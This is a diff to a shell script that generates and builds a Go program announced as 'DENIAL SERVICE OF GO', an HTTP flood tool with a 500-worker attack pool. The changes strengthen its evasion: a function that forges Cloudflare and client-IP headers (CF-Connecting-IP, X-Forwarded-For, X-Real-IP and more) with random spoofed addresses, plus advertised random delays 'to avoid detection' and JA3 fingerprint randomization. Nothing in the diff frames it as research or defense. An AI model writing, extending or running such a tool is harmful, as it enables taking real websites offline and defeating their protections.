@@ -23,7 +23,7 @@ echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Create main.go file directly (CLEAN FIXED VERSION)
+# Create main.go file directly (FINAL FIXED VERSION)
 echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"
 
 cat > main.go << 'EOF'
@@ -32,7 +32,6 @@ package main
 import (
 	"crypto/rand"
 	"crypto/tls"
-	"encoding/base64"
 	"fmt"
 	"io"
 	"math/big"
@@ -96,21 +95,6 @@ var (
 		"no-cache",
 		"no-store",
 		"must-revalidate",
-	}
-
-	// Cloudflare bypass headers
-	cloudflareBypassHeaders = []string{
-		"CF-Connecting-IP",
-		"CF-IPCountry",
-		"CF-Ray",
-		"CF-Visitor",
-		"CDN-Loop",
-		"X-Forwarded-For",
-		"X-Forwarded-Proto",
-		"X-Real-IP",
-		"True-Client-IP",
-		"X-Originating-IP",
-		"X-Remote-IP",
 	}
 
 	proxies         []string
@@ -397,15 +381,18 @@ func generateCookies() string {
 	return strings.Join(cookies, "; ")
 }
 
-func addCloudflareHeaders(req *http.Request) {
+func addCloudflareBypassHeaders(req *http.Request) {
 	spoofIP := randomIP()
 	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR"}
 	
+	// Cloudflare specific headers
 	req.Header.Set("CF-Connecting-IP", spoofIP)
 	req.Header.Set("CF-IPCountry", countries[randInt(0, len(countries)-1)])
 	req.Header.Set("CF-Ray", randomString(16)+"-"+strings.ToUpper(randomString(4)))
 	req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
 	req.Header.Set("CDN-Loop", "cloudflare")
+	
+	// IP spoofing headers
 	req.Header.Set("X-Forwarded-For", spoofIP)
 	req.Header.Set("X-Forwarded-Proto", "https")
 	req.Header.Set("X-Real-IP", spoofIP)
@@ -414,6 +401,10 @@ func addCloudflareHeaders(req *http.Request) {
 	req.Header.Set("X-Remote-IP", spoofIP)
 	req.Header.Set("X-Remote-Addr", spoofIP)
 	req.Header.Set("X-Client-IP", spoofIP)
+	
+	// Additional spoofing headers
+	req.Header.Set("X-Host", req.Host)
+	req.Header.Set("X-Forwarded-Host", req.Host)
 }
 
 func main() {
@@ -475,7 +466,7 @@ func main() {
 	if useProxy && len(proxies) > 0 {
 		fmt.Printf("[+] Proxies: %d\n", len(proxies))
 	}
-	fmt.Println("[+] Cloudflare bypass headers enabled")
+	fmt.Println("[+] Cloudflare bypass & IP spoofing enabled")
 	fmt.Println("[+] Starting... Press Ctrl+C to stop")
 
 	poolSize := 500
@@ -615,13 +606,8 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			req.Header.Set("Upgrade-Insecure-Requests", "1")
 			req.Header.Set("DNT", "1")
 			
-			// Add Cloudflare bypass headers
-			addCloudflareHeaders(req)
-
-			// Add random spoofed IP headers
-			randomSpoofIP := randomIP()
-			req.Header.Set("X-Forwarded-For", randomSpoofIP)
-			req.Header.Set("X-Real-IP", randomSpoofIP)
+			// Add Cloudflare bypass and IP spoofing headers
+			addCloudflareBypassHeaders(req)
 
 			// Add cookies
 			if randInt(1, 100) <= 50 {
@@ -767,10 +753,11 @@ if [ $? -eq 0 ]; then
     echo
     echo -e " ${GREEN}Features:${NC}"
     echo -e "   • Cloudflare bypass headers"
-    echo -e "   • IP spoofing with X-Forwarded-For"
+    echo -e "   • Advanced IP spoofing (11+ headers)"
     echo -e "   • Random delays to avoid detection"
     echo -e "   • Extended cookie generation"
-    echo -e "   • Multiple user agents and referers"
+    echo -e "   • JA3 fingerprint randomization"
+    echo -e "   • HTTP/2 support"
     echo
     exit 0
 else
